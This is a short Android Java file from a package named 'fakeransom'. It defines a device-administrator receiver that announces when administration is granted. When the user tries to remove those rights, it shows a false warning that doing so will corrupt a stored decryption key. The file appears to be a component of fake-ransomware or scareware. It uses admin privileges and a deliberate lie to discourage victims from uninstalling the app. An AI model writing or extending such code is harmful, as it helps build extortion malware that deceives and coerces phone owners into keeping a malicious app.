package com.china.fakeransom;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class LockAdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        Toast.makeText(context, "ADMINISTRATION GRANTED", Toast.LENGTH_LONG).show();
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "Removing administration will corrupt the stored decryption key. Continue anyway?";
    }
}
